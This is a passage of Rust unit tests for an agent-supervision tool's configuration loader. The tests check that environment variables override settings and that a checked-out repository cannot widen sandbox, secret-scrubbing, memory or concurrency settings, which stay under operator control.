            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_ERROR_RATE_PCT", "100"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES", "2"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_TTFT_MS", "1000"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.fallback.health.open_after_failures, 20);
        assert_eq!(cfg.fallback.health.degrade_error_rate_pct, 100);
    }

    /// Finding 12: with the latency signal on, the samples land in the
    /// smaller latency ring, so the usable ceiling drops with it -- a
    /// minimum the ring cannot reach is a knob that can never fire.
    #[test]
    fn degrade_min_samples_is_bounded_by_the_ring_its_samples_land_in() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES", "21"),
            ("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_TTFT_MS", "20000"),
        ]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("21 latency samples can never accumulate in a 20-deep ring");
        assert!(
            err.to_string()
                .contains("fallback.health.degrade_min_samples must be between 2 and 20, got 21"),
            "{err}"
        );

        // The same value is fine while the latency signal is off: the error
        // rate's own rings are twice as deep.
        let env = env_map(&[("ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES", "21")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.fallback.health.degrade_min_samples, 21);
    }

    /// Issue #455: the breaker's timing knobs are operator-only, exactly
    /// like `fallback.rollover_cooldown_secs`. `fallback.health.enabled`
    /// itself stays narrowing-only, mirroring `fallback.enabled`.
    #[test]
    fn fallback_health_timing_is_repo_forbidden_but_its_switch_may_narrow() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback.health]\ncooldown_secs = 5\n",
        )
        .expect("write");
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not tune the health breaker's cooldown");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "fallback.health.cooldown_secs must be rejected as REPO_FORBIDDEN: {err}"
        );

        // Slice A: the three degrade knobs are the same decision one step
        // earlier, and are refused the same way.
        for line in [
            "degrade_error_rate_pct = 90",
            "degrade_min_samples = 40",
            "degrade_ttft_ms = 60000",
        ] {
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[fallback.health]\n{line}\n"),
            )
            .expect("write");
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repository must not tune the degrade thresholds");
            assert!(
                is_repo_forbidden(err.as_ref()),
                "{line} must be rejected as REPO_FORBIDDEN: {err}"
            );
        }

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback.health]\nenabled = false\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("switching the breaker off is a narrowing");
        assert!(!cfg.fallback.health.enabled);
    }

    #[test]
    fn task_max_parent_outcome_bytes_reads_from_its_own_env_var() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_TASK_MAX_PARENT_OUTCOME_BYTES", "128")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.task.max_parent_outcome_bytes, 128);
    }

    /// Issue #326 B1: without this a repo checkout could simply raise its
    /// own parent-outcome budget back up, making the cap decorative -- same
    /// reasoning `memory_session_enabled_and_journal_max_entries_are_repo_
    /// forbidden` already established for `memory.*`.
    #[test]
    fn task_max_parent_outcome_bytes_is_repo_forbidden() {
        let empty = env_map(&[]);
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[task]\nmax_parent_outcome_bytes = 999999\n",
        )
        .expect("write");

        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to raise task.max_parent_outcome_bytes");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "task.max_parent_outcome_bytes must be rejected as REPO_FORBIDDEN: {err}"
        );
    }

    /// N4: `supervise.max_nudges` reads from its own env var like every
    /// other `supervise.*` key.
    #[test]
    fn max_nudges_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_MAX_NUDGES", "7")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_nudges, 7);
    }

    /// Unlike `supervise.on_failure` (a shell command) or `agent_bin` (a
    /// binary), `max_nudges` names no binary, shell command, or model
    /// choice -- only how many times a session tolerates being interrupted
    /// -- so a repository checkout may set it, the same trust level a repo's
    /// `score.*` tuning already has.
    #[test]
    fn a_repository_config_may_set_max_nudges() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[supervise]\nmax_nudges = 5\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_nudges, 5);
    }

    /// Issue #155, Phase 5(e): the deprecated `ZIRV_CTX_SUPERVISE_MAX_HEAVY_
    /// WORKERS` env var still sets the renamed `max_heavy_operations` key --
    /// the same alias treatment the deprecated TOML key gets, so an
    /// operator's existing shell profile keeps working across the upgrade.
    #[test]
    fn max_heavy_workers_env_override_sets_the_new_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS", "4")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// The renamed key reads from its own env var like every other
    /// `supervise.*` key.
    #[test]
    fn max_heavy_operations_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_HEAVY_OPERATIONS", "4")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// Issue #155, Phase 5(e): `supervise.max_heavy_workers` is renamed to
    /// `max_heavy_operations`. The old spelling must still PARSE, not merely
    /// be documented: `CtxConfig`'s structs are `deny_unknown_fields`, an
    /// installed older binary hard-errors on an unknown key, and an
    /// operator's existing `~/.zirv/ctx.toml` has to keep working across the
    /// upgrade in both directions.
    #[test]
    fn the_deprecated_max_heavy_workers_alias_still_sets_the_new_key() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_heavy_workers = 2\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert_eq!(cfg.supervise.max_heavy_operations, 2);
    }

    /// The new spelling wins when both are present -- an operator mid-
    /// migration must not get the old value silently.
    #[test]
    fn the_new_key_wins_over_the_deprecated_alias() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_heavy_workers = 2\nmax_heavy_operations = 4\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// Both spellings stay `REPO_FORBIDDEN`: a checked-out repo raising the
    /// machine-wide concurrency budget is the exact case issue #133's BSOD
    /// incident created it for, and a renamed key must not become a hole.
    #[test]
    fn neither_spelling_may_come_from_a_repo_layer() {
        for key in ["max_heavy_operations", "max_heavy_workers"] {
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv").join(CTX_CONFIG_FILE),
                format!("[supervise]\n{key} = 8\n"),
            )
            .expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo layer must be rejected");
            assert!(err.to_string().contains(key), "got {err}");
        }
    }

    /// Issue #267: the writer pool's own cap reads from its own env var
    /// like every other `supervise.*` key.
    #[test]
    fn max_writers_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_WRITERS", "3")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_writers, 3);
    }

    /// Issue #267: `max_writers` is `REPO_FORBIDDEN`, same reasoning as
    /// `max_heavy_operations` -- a checked-out repo must not be able to
    /// raise the machine-wide writer-concurrency budget.
    #[test]
    fn max_writers_may_not_come_from_a_repo_layer() {
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_writers = 8\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo layer must be rejected");
        assert!(err.to_string().contains("max_writers"), "got {err}");
    }

    /// Issue #310: each of the 3a/3b `[supervise]` keys reads from its own
    /// env var like every other `supervise.*` key.
    #[test]
    fn idle_no_tool_secs_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_IDLE_NO_TOOL_SECS", "60")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.idle_no_tool_secs, 60);
    }

    #[test]
    fn in_tool_secs_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_IN_TOOL_SECS", "600")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.in_tool_secs, 600);
    }

    #[test]
    fn stall_grace_secs_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_STALL_GRACE_SECS", "30")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.stall_grace_secs, 30);
    }

    /// Issue #379: the compaction fuse reads from its own env var like every
    /// other `supervise.*` key.
    #[test]
    fn compact_stall_secs_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_COMPACT_STALL_SECS", "90")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.compact_stall_secs, 90);
    }

    #[test]
    fn compact_timeout_ms_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_COMPACT_TIMEOUT_MS", "12345")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.compact_timeout_ms, 12345);
    }

    #[test]
    fn chain_max_restarts_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_CHAIN_MAX_RESTARTS", "5")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.chain_max_restarts, 5);
    }

    #[test]
    fn chain_max_gap_secs_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_CHAIN_MAX_GAP_SECS", "600")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.chain_max_gap_secs, 600);
    }

    /// Issue #310: every 3a/3b `[supervise]` key is `REPO_FORBIDDEN`, same
    /// reasoning as `max_writers` -- a checked-out repo must not be able to
    /// silently defeat the stall detector or the restart-chain breaker by
    /// raising its own thresholds.
    #[test]
    fn no_supervisor_reliability_key_may_come_from_a_repo_layer() {
        for key in [
            "idle_no_tool_secs",
            "in_tool_secs",
            "stall_grace_secs",
            // Issue #379: the compaction fuse is one of these too.
            "compact_stall_secs",
            "chain_max_restarts",
            "chain_max_gap_secs",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv").join(CTX_CONFIG_FILE),
                format!("[supervise]\n{key} = 999999\n"),
            )
            .expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo layer must be rejected");
            assert!(err.to_string().contains(key), "got {err}");
        }
    }

    /// Unlike `max_heavy_operations`, `heavy_command_patterns` is not
    /// `REPO_FORBIDDEN`: a repo may ADD a pattern (only ever narrowing, per
    /// the field's own doc comment), but a plain deep merge would let a
    /// repo's array -- including an empty one -- silently REPLACE the
    /// operator's home-layer list instead of adding to it. Proves the union,
    /// end to end through `CtxConfig::load`, the same way
    /// `sandbox_extra_deny_unions_the_operators_and_the_repos_own_entries`
    /// proves it for `extra_deny`.
    #[test]
    fn repo_heavy_command_patterns_are_added_not_replaced() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = [\"npm run build*\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = []\n",
        )
        .expect("write");

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg.supervise
                .heavy_command_patterns
                .contains(&"npm run build*".to_string()),
            "an empty repo array must not erase the operator's own pattern: {:?}",
            cfg.supervise.heavy_command_patterns
        );

        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = [\"yarn build*\"]\n",
        )
        .expect("write");
        let cfg2 = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg2.supervise
                .heavy_command_patterns
                .contains(&"npm run build*".to_string()),
            "the operator's own pattern must survive: {:?}",
            cfg2.supervise.heavy_command_patterns
        );
        assert!(
            cfg2.supervise
                .heavy_command_patterns
                .contains(&"yarn build*".to_string()),
            "the repo's own addition must land too: {:?}",
            cfg2.supervise.heavy_command_patterns
        );
    }

    /// S1-class boundary, same rationale as `prompt.max_repo_bytes` and
    /// `mail.max_delivered_bytes`: a repo checkout must not be able to seed
    /// the bank, grow its own cap, switch automatic harvesting on, or switch
    /// its own shared scope back on for anyone who runs zirv there.
    #[test]
    fn a_repository_config_may_not_raise_a_memory_cap_or_enable_harvesting() {
        for (key, value) in [
            ("enabled", "true"),
            ("harvest", "true"),
            ("max_entries", "100000"),
            ("max_entry_bytes", "100000"),
            ("max_injected_bytes", "100000"),
            ("shared_enabled", "true"),
            ("core_max_bytes", "100000"),
            ("retrieval_max_bytes", "100000"),
            ("retrieval_max_entries", "100000"),
            ("harvest_max_entries", "100000"),
            ("harvest_max_bytes", "100000"),
            ("session_enabled", "false"),
            ("journal_max_entries", "100000"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[memory]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("memory.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_MEMORY"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_set_memory_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_MEMORY", "false"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRIES", "5"),
            ("ZIRV_CTX_MEMORY_SHARED", "false"),
            ("ZIRV_CTX_MEMORY_CORE_MAX_BYTES", "512"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES", "1024"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES", "2"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES", "3"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES", "512"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.memory.enabled, "the environment is the operator");
        assert!(
            !cfg.memory.shared_enabled,
            "including the shared-scope gate"
        );
        assert_eq!(cfg.memory.max_entries, 5);
        assert_eq!(cfg.memory.core_max_bytes, 512);
        assert_eq!(cfg.memory.retrieval_max_bytes, 1024);
        assert_eq!(cfg.memory.retrieval_max_entries, 2);
        assert_eq!(cfg.memory.harvest_max_entries, 3);
        assert_eq!(cfg.memory.harvest_max_bytes, 512);
    }

    /// Dash refresh PR2: same repo-settable exception as `idle_quiet_ms`
    /// right above -- `motion` is purely presentational.
    #[test]
    fn a_repository_config_may_set_dash_motion() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[dash]\nmotion = \"reduced\"\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.motion, DashMotion::Reduced);
    }

    #[test]
    fn env_overrides_dash_motion() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_DASH_MOTION", "reduced")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.motion, DashMotion::Reduced);
    }

    /// Unlike every other `dash.*` key, `idle_quiet_ms` is a pure timing knob
    /// over a session the operator already chose to run in the dashboard --
    /// the same class of decision `pace.soft_percent` is -- so a repo checkout
    /// may set it, same as `chat.model`.
    #[test]
    fn a_repository_config_may_set_dash_idle_quiet_ms() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[dash]\nidle_quiet_ms = 5000\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.idle_quiet_ms, 5000);
    }

    #[test]
    fn env_overrides_dash_idle_quiet_ms() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_DASH_IDLE_QUIET_MS", "2500")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.idle_quiet_ms, 2500);
    }

    #[test]
    fn repo_layer_cannot_touch_dash_keys() {
        for (key, value) in [
            ("enabled", "false"),
            ("sidebar_cols", "80"),
            ("roster_max_age_secs", "1"),
            ("max_panes", "999"),
            ("mouse", "false"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[dash]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("dash.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_DASH"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    /// Bug B (harness/model parity, 2026-08-22, fix round 2): a repo
    /// checkout must not be able to turn its own sandboxing off. `sandbox.
    /// enabled` gates `AgentAdapter::default_sandbox_args()` on every
    /// adapter -- for claude that means the whole generated `SHIPPED_
    /// POSTURE_ALLOW`/`_DENY` set (see `adapters/mod.rs`), not merely a
    /// `--permission-mode` flag, so a repo widening this key would strip
    /// the operator's own default protection wholesale, end to end.
    #[test]
    fn repo_layer_cannot_touch_sandbox_keys() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nenabled = false\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set this key")
            .to_string();
        assert!(err.contains("sandbox.enabled"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SANDBOX"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Delegated workers lose secret-shaped env by default; only the operator may opt out,
    /// and the environment is the final word.
    #[test]
    fn worker_secret_scrub_is_on_by_default_and_only_the_operator_may_opt_out() {
        assert!(SandboxConfig::default().scrub_worker_secrets);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_worker_secrets = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not disable the scrub")
            .to_string();
        assert!(err.contains("sandbox.scrub_worker_secrets"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SANDBOX_SCRUB_WORKER_SECRETS"),
            "names the operator escape hatch: {err}"
        );

        std::fs::remove_file(repo.path().join(".zirv/ctx.toml")).expect("remove");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_worker_secrets = false\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(
            !cfg.sandbox.scrub_worker_secrets,
            "the operator layer opts out"
        );

        std::fs::remove_file(home.path().join(".zirv/ctx.toml")).expect("remove");
        let env = env_map(&[("ZIRV_CTX_SANDBOX_SCRUB_WORKER_SECRETS", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("loads");
        assert!(
            !cfg.sandbox.scrub_worker_secrets,
            "the environment opts out"
        );
    }

    /// Issue #329: the subprocess env scrub is off by default (it strips
    /// `SSH_AUTH_SOCK` and forces the permission mode to `default`), only
    /// the operator may turn it on, and the environment is the final word.
    #[test]
    fn subprocess_env_scrub_is_off_by_default_and_operator_only() {
        assert!(!SandboxConfig::default().scrub_subprocess_env);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_subprocess_env = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set this key")
            .to_string();
        assert!(err.contains("sandbox.scrub_subprocess_env"), "got {err}");

        std::fs::remove_file(repo.path().join(".zirv/ctx.toml")).expect("remove");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_subprocess_env = true\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(
            cfg.sandbox.scrub_subprocess_env,
            "the operator layer may turn it on"
        );

        let env = env_map(&[("ZIRV_CTX_SANDBOX_SCRUB_SUBPROCESS_ENV", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("loads");
        assert!(
            !cfg.sandbox.scrub_subprocess_env,
            "the environment wins outright"
        );
    }

    /// The end-to-end path the coordinator asked for: even if the hard
    /// rejection above were ever weakened to a narrow-only fold instead (the
    /// shape most other `[policy]`-adjacent keys use), the resolved config
    /// must still carry the operator's own `true` through to the actual
    /// generated argv on both adapters -- not just to a boolean field
    /// nothing downstream reads.
    #[test]
    fn a_repo_widening_attempt_on_sandbox_enabled_never_reaches_either_adapters_argv() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nenabled = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);

        // The repo file alone is a hard load error (see the test above);
        // simulate what a caller degraded to the operator-only layers would
        // see instead (`config::degrade_to_operator_only`, the same
        // fail-closed path `surface_collect.rs`/`hook.rs` already take on an
        // unreadable repo config) -- `cfg.sandbox` still defaults `true`.
        let cfg = super::degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert!(cfg.sandbox.enabled);
        use super::super::adapters::AgentAdapter;
        let claude = super::super::adapters::claude::ClaudeAdapter::new(None);
        assert!(
            claude
                .default_sandbox_args(
                    &Default::default(),
                    &Default::default(),
                    &[],
                    super::super::adapters::LaunchMode::Headless,
                )
                .iter()
                .any(|a| a.starts_with("--allowedTools=")),
            "the generated permission set must still reach the argv"
        );
    }

    /// Fix round 3 (2026-08-22): `sandbox.extra_allow` is operator-only, the
    /// same asymmetry as every other whole-key `REPO_FORBIDDEN` entry -- a
    /// repo checkout adding to the allow list would be a privilege
    /// *widening*, not the narrowing a repo layer is otherwise permitted.
    #[test]
    fn repo_layer_cannot_add_sandbox_extra_allow_entries() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_allow = [\"Bash(deploy *)\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the allow list")
            .to_string();
        assert!(err.contains("sandbox.extra_allow"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SANDBOX_EXTRA_ALLOW"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Security review (2026-08-31): `dash.workdir_roots` is operator-only,
    /// the same widening-only asymmetry `repo_layer_cannot_add_sandbox_
    /// extra_allow_entries` above pins for `sandbox.extra_allow` -- a repo
    /// checkout naming a root here would let its own compromised pane obtain
    /// write authority over any directory under it, defeating the whole
    /// point of confining pane `--workdir` in the first place.
    #[test]
    fn repo_layer_cannot_set_dash_workdir_roots() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[dash]\nworkdir_roots = [\"/\"]\n",
        )
        .expect("write");
